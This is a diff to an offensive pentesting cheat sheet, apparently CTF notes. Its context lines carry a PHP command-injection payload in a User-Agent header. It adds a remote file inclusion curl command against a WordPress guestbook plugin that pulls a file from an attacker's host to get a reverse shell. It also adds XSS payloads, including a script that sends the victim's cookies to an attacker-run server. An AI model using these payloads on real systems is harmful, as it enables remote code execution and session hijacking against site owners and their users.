@@ -122,9 +122,21 @@ curl -s -H "User-Agent: <?php system('whoami'); ?>" "http://localhost/example.ph
 You can create a malicious php in your local machine and make the remote server download and execute this file.
 To exploit this and get a reverse shell you need three tabs opened and execute in the next order:
 ```
-
+curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://$malicious_IP/maliciousfile.php
 ```
 
+
+## XSS
+If you discover some input where you can add html code you can try inject javascript code with:
+```
+<scrip>alert("testing XSS")</script>
+<script>alert(document.cookie)</script>
+
+##Open an http server in your malicious machine (python3 -m http.server)
+<script>document.write('<img src="http://127.0.0.1:8000/daffi.png?cookie=' + document.cookie + '">')</script>
+```
+
+To Change the cookie in your own browser you can use de plugin "EditThisCookie"
 
 --------------------------------------
 ## CMR
